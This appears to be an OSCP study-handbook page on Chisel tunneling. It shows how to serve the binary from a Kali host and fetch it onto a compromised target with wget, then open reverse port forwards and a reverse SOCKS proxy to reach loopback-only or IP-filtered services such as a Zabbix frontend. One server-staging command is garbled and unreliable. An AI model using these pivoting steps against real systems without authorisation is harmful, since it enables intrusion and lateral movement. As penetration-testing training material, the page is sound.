---
title: "Chisel"
slug: chisel
category: notes
handbook: oscp
tags: ["pivoting"]
draft: false
pubDatetime: 2026-08-10T21:41:42+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Chisel is a single Go binary that acts as both client and server, tunneling TCP over one outbound connection the client makes to the server."
---
Chisel is a single Go binary that acts as both client and server, tunneling TCP over one outbound connection the client makes to the server. The case it fits here: a port that only answers on the target itself (loopback bind or inbound firewall) and there are no credentials for an SSH `-L` forward. Decision context is in [Tunneling and Pivoting](/collections/oscp/tunneling-and-pivoting), and the SSH equivalent lives in [SSH Tunnels](/collections/oscp/ssh-tunnels).

## Install

Kali packages chisel via apt:

```bash
sudo apt install -y chisel
```

That build is dynamically linked against Kali's own glibc, which is fine for running the **server on Kali** but breaks the moment it is pushed to a target running an older glibc: `GLIBC_2.32' not found`, the exact failure the dynamically linked `pspy32s`/`pspy64s` builds hit in [pspy](/collections/oscp/pspy). Do not push the apt-installed binary to a target.

The project's own GitHub releases build with `CGO_ENABLED=0` (its Makefile sets this for every platform target), producing a static binary with no glibc dependency at all regardless of how old the target is. That is the one to push over, pulled by asset name so the command does not go stale as versions bump:

```bash
uname -m    # confirm target arch first, arch table in [Ligolo-ng](/collections/oscp/ligolo-ng)
curl -s https://api.github.com/repos/jpillora/chisel/releases/latest \
  | grep browser_download_url | grep 'linux_amd64.gz"' | cut -d'"' -f4
```

Recent releases also ship `.apk`/`.deb`/`.rpm` packages alongside the plain archive, all matching `linux_amd64` loosely, so the `.gz"` anchor (with the closing quote) is what keeps this to the one plain binary archive.

```bash
wget '<url from above>' -O chisel.gz
gunzip chisel.gz
chmod +x chisel
```

Confirm it is actually static before relying on it:

```bash
file chisel
# chisel: ELF 64-bit LSB executable, x86-64, ..., statically linked, ...
```

## Transfer to the Target

The binary has to be on the target before anything else works. Serve the static build from Kali and pull it down, same pattern as [pspy](/collections/oscp/pspy) and [LinPEAS](/collections/oscp/linpeas). `KALI` throughout is the Kali address reachable from the target:

```bash
# Kali, stage and serve the static binary fetched above
cp chisel ~/OSCP/tools/chisel
cd ~/OSCP/tools && python3 -m http.server&& python3 -m http.server sudo python3 -m http.server 8000
```

```bash
# target
cd /tmp
wget http://KALI:8000/chisel -O chisel
chmod +x chisel
```

Other transfer channels are in [File Transfers](/collections/oscp/file-transfers) for when `wget` is missing or outbound HTTP to that port is blocked.

## Start the Server (Kali)

```bash
chisel server -p 8080 --reverse
```

`--reverse` is required or the server rejects reverse tunnel requests from clients, since without it a connecting client could otherwise get the server to open arbitrary ports on itself.

## Connect the Client (Target)

From the directory the binary was downloaded into, request a reverse forward:

```bash
./chisel client KALI:8080 R:9000:127.0.0.1:65432
```

`R:` makes this a reverse forward: Kali listens on `9000` and relays inbound connections back down the tunnel the target already opened, to `127.0.0.1:65432` as seen from the target. Only the outbound connection from target to `KALI:8080` has to be allowed, which is what makes this work when inbound to the target is firewalled. Use `127.0.0.1` on the target side even if the service showed as bound to `0.0.0.0`, since that always reaches it locally regardless of which interface it is actually bound to.

The same forward also defeats a service that is reachable but source-IP filtered rather than loopback-bound, an app that only trusts `127.0.0.1` and shows something else (a maintenance page, a redirect, a 403) to every other address. Forwarding to that app's real port makes the request Kali sends arrive on the target as a connection from its own loopback, satisfying the check. On Zab a Zabbix frontend serving a "Zabbix is under maintenance" page to its own external IP served the real login page over `R:9000:127.0.0.1:80` instead.

Point real tools at the forwarded port on Kali like any local service:

```bash
nmap -sV -sC -p9000 127.0.0.1
curl -s 127.0.0.1:9000/
```

## Reverse SOCKS

When several unknown ports need reaching rather than one already-identified one, request a SOCKS proxy instead of a single forward:

```bash
./chisel client KALI:8080 R:socks
```

Kali gets a SOCKS5 listener on `127.0.0.1:1080` by default. Route tools through it with proxychains, subject to the same limitations noted in [Tunneling and Pivoting](/collections/oscp/tunneling-and-pivoting): Go and statically linked binaries ignore `LD_PRELOAD` and bypass the proxy, `sudo` strips it too, and there is no ICMP.
